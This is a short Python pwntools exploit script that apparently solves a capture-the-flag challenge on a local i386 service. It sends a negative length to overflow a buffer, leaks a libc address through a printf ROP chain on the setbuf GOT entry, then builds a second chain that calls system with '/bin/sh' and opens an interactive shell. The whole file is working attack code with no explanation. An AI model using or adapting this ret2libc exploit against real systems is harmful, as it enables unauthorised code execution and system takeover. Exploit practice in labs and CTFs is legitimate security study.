#!/usr/bin/env python
from pwn import *

rhp = {'host':"localhost", 'port':30527}

context(os = 'linux', arch = 'i386')

addr_plt_printf = 0x08048430
addr_got_setbuf = 0x0804a00c
addr_main = 0x080485ca
offset_libc_setbuf = 0x00065ff0

addr_libc_str_sh = 0x15b9ab
offset_libc_system = 0x0003ada0
offset_libc_exit = 0x0002e9d0
ret_addr_dummy = 0xdeadbeef

def attack(conn):
    #----- Get addr_libc_base -----#
    rop = p32(addr_plt_printf)
    rop += p32(addr_main)
    rop += p32(addr_got_setbuf)

    conn.recvuntil('Message Length >> ')
    conn.sendline(str(-144))
    conn.recvuntil('Name >> ')
    conn.sendline(rop)
    conn.recvuntil('Message : \n')

    addr_libc_setbuf = u32(conn.recv(4))
    addr_libc_base = addr_libc_setbuf - offset_libc_setbuf
    info('addr_libc_base = 0x%08x' % addr_libc_base)

    #----- Get shell -----#
    addr_system = addr_libc_base + offset_libc_system
    addr_exit = addr_libc_base + offset_libc_exit
    addr_str_sh = addr_libc_base + addr_libc_str_sh

    rop2 = p32(addr_system)
    # rop2 += p32(addr_exit)
    rop2 += p32(ret_addr_dummy)
    rop2 += p32(addr_str_sh)

    conn.recvuntil('Message Length >> ')
    conn.sendline(str(-144))
    conn.recvuntil('Name >> ')
    conn.sendline(rop2)
    conn.recvuntil('Message : \n')

if __name__=='__main__':
    conn = remote(rhp['host'], rhp['port'])
    attack(conn)
    conn.interactive()

